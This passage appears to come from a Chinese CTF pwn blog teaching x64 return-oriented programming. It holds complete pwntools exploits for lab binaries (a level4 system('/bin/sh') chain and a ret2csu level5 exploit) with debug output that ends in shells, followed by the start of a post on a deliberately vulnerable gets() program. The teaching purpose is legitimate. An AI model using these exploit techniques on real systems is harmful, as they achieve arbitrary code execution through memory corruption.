string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##########the system########"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> system_addr <span class="token operator">+</span> binsh_offset<span class="token keyword">print</span> <span class="token string">"##########the binsh########"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>pop_ret_addr <span class="token operator">=</span> system_addr <span class="token operator">+</span> pop_ret_offset<span class="token keyword">print</span> <span class="token string">"##########the pop rdi ret########"</span> <span class="token operator">+</span>str<span class="token punctuation">(</span>pop_ret_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x0000000000400585 : ret</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400585</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x000000000012188b : pop rax ; pop rdi ; call rax</span>ppc_offset <span class="token operator">=</span> <span class="token number">0x000000000012188b</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>ppc_addr <span class="token operator">=</span> ppc_offset <span class="token operator">+</span> system_addrpayload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>ppc_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>注意到，我的payload有两个都可行。payload1 就是我们首先想到的思路，还放了一个p64(0x0000000000400585)，没错在执行system函数遇到了堆栈不平衡（日了狗了）<br>payload2 <strong>是想到了call指令来执行system函数（call 要放got地址）。pop rax 将system地址放入rax ，pop rdi将参数/bin/sh地址放入rdi，call rax：执行！（没有遇到堆栈步平衡问题，感觉以后可以多用call）</strong></p><h3 id="本地测试结果"><a href="#本地测试结果" class="headerlink" title="本地测试结果"></a>本地测试结果</h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x1c bytes:    <span class="token string">'0x7ffff782f440\n'</span>    <span class="token string">'Hello, World\n'</span><span class="token comment" spellcheck="true">##########the system########140737345942592</span><span class="token comment" spellcheck="true">##########the binsh########140737347403418</span><span class="token comment" spellcheck="true">##########the pop rdi ret########140737345754463</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0xa1 bytes:    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│    *    00000080  41 41 41 41  41 41 41 41  8b 18 90 f7  ff 7f 00 00  │AAAA│AAAA│····│····│    00000090  40 f4 82 f7  ff 7f 00 00  9a 3e 99 f7  ff 7f 00 00  │@···│····│·<span class="token operator">></span>··│····│    000000a0  0a                                                  │·│    000000a1<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode$ <span class="token function">whoami</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x7 bytes:    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x7 bytes:    <span class="token string">'hunter\n'</span>hunter$  </code></pre><h2 id="4：level5–通用gadgets"><a href="#4：level5–通用gadgets" class="headerlink" title="4：level5–通用gadgets"></a>4：level5–通用gadgets</h2><p><strong>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</strong></p><p>level3和level4的程序都留了一些辅助函数在程序中，这次我们将这些辅助函数去掉再来挑战一下。目标程序level5.c如下：</p><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>没错你只有read和write函数和蒸米X86的level3 是一样的</p><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。<br>因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。<br>我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？<strong>其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d -Mintel level5观察一下__libc_csu_init()这个函数。</strong><br><strong>一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</strong></p><pre class=" language-bash"><code class="language-bash">00000000004005a0 <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:  4005a0:    48 89 6c 24 d8           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x28<span class="token punctuation">]</span>,rbp  4005a5:    4c 89 64 24 e0           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x20<span class="token punctuation">]</span>,r12  4005aa:    48 8d 2d 73 08 20 00     lea    rbp,<span class="token punctuation">[</span>rip+0x200873<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 600e24 &lt;__init_array_end></span>  4005b1:    4c 8d 25 6c 08 20 00     lea    r12,<span class="token punctuation">[</span>rip+0x20086c<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 600e24 &lt;__init_array_end></span>  4005b8:    4c 89 6c 24 e8           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x18<span class="token punctuation">]</span>,r13  4005bd:    4c 89 74 24 f0           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x10<span class="token punctuation">]</span>,r14  4005c2:    4c 89 7c 24 f8           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x8<span class="token punctuation">]</span>,r15  4005c7:    48 89 5c 24 d0           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x30<span class="token punctuation">]</span>,rbx  4005cc:    48 83 ec 38              sub    rsp,0x38  4005d0:    4c 29 e5                 sub    rbp,r12  4005d3:    41 89 fd                 mov    r13d,edi  4005d6:    49 89 f6                 mov    r14,rsi  4005d9:    48 c1 fd 03              sar    rbp,0x3  4005dd:    49 89 d7                 mov    r15,rdx  4005e0:    e8 1b fe ff ff           call   400400 <span class="token operator">&lt;</span>_init<span class="token operator">></span>  4005e5:    48 85 ed                 <span class="token function">test</span>   rbp,rbp  4005e8:    74 1c                    je     400606 <span class="token operator">&lt;</span>__libc_csu_init+0x66<span class="token operator">></span>  4005ea:    31 db                    xor    ebx,ebx  4005ec:    0f 1f 40 00              nop    DWORD PTR <span class="token punctuation">[</span>rax+0x0<span class="token punctuation">]</span>  4005f0:    4c 89 fa                 mov    rdx,r15              <span class="token comment" spellcheck="true">#关注点</span>  4005f3:    4c 89 f6                 mov    rsi,r14  4005f6:    44 89 ef                 mov    edi,r13d  4005f9:    41 ff 14 <span class="token function">dc</span>              call   QWORD PTR <span class="token punctuation">[</span>r12+rbx*8<span class="token punctuation">]</span>  4005fd:    48 83 c3 01              add    rbx,0x1  400601:    48 39 eb                 <span class="token function">cmp</span>    rbx,rbp  400604:    75 ea                    jne    4005f0 <span class="token operator">&lt;</span>__libc_csu_init+0x50<span class="token operator">></span>  400606:    48 8b 5c 24 08           mov    rbx,QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>     <span class="token comment" spellcheck="true">#关注点从rsp+8开始读取栈中数据</span>  40060b:    48 8b 6c 24 10           mov    rbp,QWORD PTR <span class="token punctuation">[</span>rsp+0x10<span class="token punctuation">]</span>  400610:    4c 8b 64 24 18           mov    r12,QWORD PTR <span class="token punctuation">[</span>rsp+0x18<span class="token punctuation">]</span>  400615:    4c 8b 6c 24 20           mov    r13,QWORD PTR <span class="token punctuation">[</span>rsp+0x20<span class="token punctuation">]</span>  40061a:    4c 8b 74 24 28           mov    r14,QWORD PTR <span class="token punctuation">[</span>rsp+0x28<span class="token punctuation">]</span>  40061f:    4c 8b 7c 24 30           mov    r15,QWORD PTR <span class="token punctuation">[</span>rsp+0x30<span class="token punctuation">]</span>  400624:    48 83 c4 38              add    rsp,0x38  400628:    c3                       ret      400629:    0f 1f 80 00 00 00 00     nop    DWORD PTR <span class="token punctuation">[</span>rax+0x0<span class="token punctuation">]</span></code></pre><p>** 从4005f0开始：**<br>    1 r15=&gt;rdx,r14=&gt;rsi ,r13d=&gt;edi<br>    2 call指令我们可以利用，即将rbx弄成0，r12放目标函数got地址<br>    3 因为要执行上面rbx会变成0，add指令后rbx=1<br>    4 cmp    rbx,rbp如果相等就不会执行jne所以要把rbp设为1<br>    5 然后是6个mov将从rsp+8开始把栈中数据放入，rbx，rbp，r12，r13，r14，r15<br>    6 rsp往高地址移动0x38（56）字节即移动7次<br>    7 ret用来控制跳转到4005f0目的是执行r12中的函数<br><strong>所以先用栈溢出将程序跳到400606读取我们构造的payload最后ret到4005f0来执行r12中的函数，因为程序会继续往下走再次ret我们可以控制跳转到main函数，准备下一次攻击。</strong></p><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p>我们先构造payload1，利用write()输出write在内存中的地址。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#rdx=r15,rsi=r14,rdi=edi=r13d,r12=write_got,rbx=0,rbp=1 ret=0x4005f0  ##注释在这种长exp显得尤为重要</span><span class="token comment" spellcheck="true">#write(rdi=1,rsi=write_got,rdx=8)</span>payload1 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>   <span class="token comment" spellcheck="true">#NULL</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># </span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload1 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span></code></pre><h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。bss可用readelf -S level5获取</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#rdx=r15,rsi=r14,rdi=edi=r13d,r12=read_got,rbx=0,rbp=1 ret=0x4005f0</span><span class="token comment" spellcheck="true">#read(rdi=0,rsi=bss_addr,rdx=16)  16字节是读取system的地址还有字符串/bin/sh\x00</span>payload2 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_read<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload2 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span></code></pre><h3 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h3><p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh\x00”保存在了.bss段首地址+8字节上。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#rdx=r15,rsi=r14,rdi=edi=r13d,r12=bss_addr,rbx=0,rbp=1 ret=0x4005f0</span><span class="token comment" spellcheck="true">#system(rdi=bss_addr + 8) rsi=0 rdx=0</span>payload3 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span></code></pre><h3 id="EXP（蒸米）"><a href="#EXP（蒸米）" class="headerlink" title="EXP（蒸米）"></a>EXP（蒸米）</h3><p>我本地测试遇到太多玄学问题了（很操蛋）</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'level5'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level5'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p = remote('127.0.0.1',10001)</span>got_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"got_write: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span>got_read <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"got_read: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>got_read<span class="token punctuation">)</span>main <span class="token operator">=</span> <span class="token number">0x400564</span>off_system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"off_system_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>off_system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span><span class="token comment" spellcheck="true">#write(rdi=1, rsi=write.got, rdx=4)</span>payload1 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload1 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n#############sending payload1#############\n"</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"write_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> write_addr <span class="token operator">-</span> off_system_addr<span class="token keyword">print</span> <span class="token string">"system_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>bss_addr<span class="token operator">=</span><span class="token number">0x601028</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span><span class="token comment" spellcheck="true">#read(rdi=0, rsi=bss_addr, rdx=16)</span>payload2 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_read<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload2 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n#############sending payload2#############\n"</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span><span class="token comment" spellcheck="true">#system(rdi = bss_addr+8 = "/bin/sh")</span>payload3 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n#############sending payload3#############\n"</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p>蒸米原文：<br>要注意的是，当我们把程序的io重定向到socket上的时候，根据网络协议，因为发送的数据包过大，read()有时会截断payload，造成payload传输不完整造成攻击失败。这时候要多试几次即可成功。如果进行远程攻击的话，需要保证ping值足够小才行（局域网）。最终执行结果如下：</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Started program <span class="token string">'./level5'</span>got_write: 0x601000got_read: 0x601008off_system_addr: 0xa1c40<span class="token comment" spellcheck="true">#############sending payload1#############</span>write_addr: 0x7f79d5779370system_addr: 0x7f79d56d7730<span class="token comment" spellcheck="true">#############sending payload2#############</span><span class="token comment" spellcheck="true">#############sending payload3#############</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode$ <span class="token function">whoami</span>mzheng</code></pre><h2 id="5：总结"><a href="#5：总结" class="headerlink" title="5：总结"></a>5：总结</h2><p><strong><em>原来pwn的艺术不是explosion，而是gadgets链构造，这种艺术我等凡人无法欣赏</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>偶遇栈平衡</title>
      <link href="/2020/07/08/ou-yu-zhan-ping-heng/"/>
      <url>/2020/07/08/ou-yu-zhan-ping-heng/</url>
      
        <content type="html"><![CDATA[<h2 id="1：我自己写的一个简单程序"><a href="#1：我自己写的一个简单程序" class="headerlink" title="1：我自己写的一个简单程序"></a>1：我自己写的一个简单程序</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat test.py"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>溢出漏洞显而易见</p><h2 id="2：checksec"><a href="#2：checksec" class="headerlink" title="2：checksec"></a>2：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/buu-pwn$ checksec <span class="token function">test</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/buu-pwn/test'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>64位常规操作</p><h2 id="3：IDA"><a href="#3：IDA" class="headerlink" title="3：IDA"></a>3：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> 